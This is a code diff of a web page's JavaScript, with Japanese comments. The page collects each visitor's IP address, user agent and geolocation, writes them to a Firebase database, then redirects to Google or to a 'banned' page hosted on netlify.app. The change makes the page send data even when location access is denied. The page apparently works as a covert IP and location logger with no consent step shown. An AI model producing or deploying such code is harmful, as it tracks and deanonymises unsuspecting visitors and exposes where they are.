@@ -50,52 +50,58 @@
                     navigator.geolocation.getCurrentPosition(position => {
                         const location = `${position.coords.latitude}, ${position.coords.longitude}`;
                         document.getElementById("location").textContent = location;
-
-                        // 現在の時間を取得
-                        const timestamp = new Date().toLocaleString();
-                        document.getElementById("timestamp").textContent = timestamp;
-
-                        // Firebase Realtime Databaseにデータを送信
-                        const dataRef = db.ref('user-data');
-                        const newDataRef = dataRef.push();
-
-                        // データをオブジェクトとして送信
-                        const userData = {
-                            timestamp: timestamp,
-                            ip: ip,
-                            location: location,
-                            userAgent: userAgent
-                        };
-
-                        // データを送信
-                        newDataRef.set(userData, (error) => {
-                            if (error) {
-                                console.error('データの送信中にエラーが発生しました: ', error);
-                            } else {
-                                console.log('データがFirebaseに送信されました。');
-                            }
-
-                            // IPがBANされている場合、BANページにリダイレクト
-                            if (bannedIPs.includes(ip)) {
-                                window.location.href = 'https://lighthearted-manatee-c3344e.netlify.app/banned.html';
-                            } else {
-                                // BANされていない場合、Googleにリダイレクト
-                                window.location.href = 'https://www.google.com';
-                            }
-                        });
+                        sendData(location);
+                    }, error => {
+                        const location = 'N/A'; // 位置情報の取得に失敗した場合、N/Aとして設定
+                        document.getElementById("location").textContent = location;
+                        sendData(location);
                     });
                 } else {
-                    // ブラウザが位置情報をサポートしていない場合、データを送信せずにリダイレクト
-                    if (bannedIPs.includes(ip)) {
-                        window.location.href = 'https://lighthearted-manatee-c3344e.netlify.app/banned.html';
-                    } else {
-                        window.location.href = 'https://www.google.com';
-                    }
+                    // ブラウザが位置情報をサポートしていない場合、N/Aとして設定
+                    const location = 'N/A';
+                    document.getElementById("location").textContent = location;
+                    sendData(location);
                 }
             })
             .catch(error => {
                 console.error('IPアドレスの取得中にエラーが発生しました: ', error);
             });
+
+        // データを送信する関数
+        function sendData(location) {
+            // 現在の時間を取得
+            const timestamp = new Date().toLocaleString();
+            document.getElementById("timestamp").textContent = timestamp;
+
+            // Firebase Realtime Databaseにデータを送信
+            const dataRef = db.ref('user-data');
+            const newDataRef = dataRef.push();
+
+            // データをオブジェクトとして送信
+            const userData = {
+                timestamp: timestamp,
+                ip: ip,
+                location: location,
+                userAgent: userAgent
+            };
+
+            // データを送信
+            newDataRef.set(userData, (error) => {
+                if (error) {
+                    console.error('データの送信中にエラーが発生しました: ', error);
+                } else {
+                    console.log('データがFirebaseに送信されました。');
+                }
+
+                // IPがBANされている場合、BANページにリダイレクト
+                if (bannedIPs.includes(ip)) {
+                    window.location.href = 'https://lighthearted-manatee-c3344e.netlify.app/banned.html';
+                } else {
+                    // BANされていない場合、Googleにリダイレクト
+                    window.location.href = 'https://www.google.com';
+                }
+            });
+        }
     </script>
 </body>
 </html>
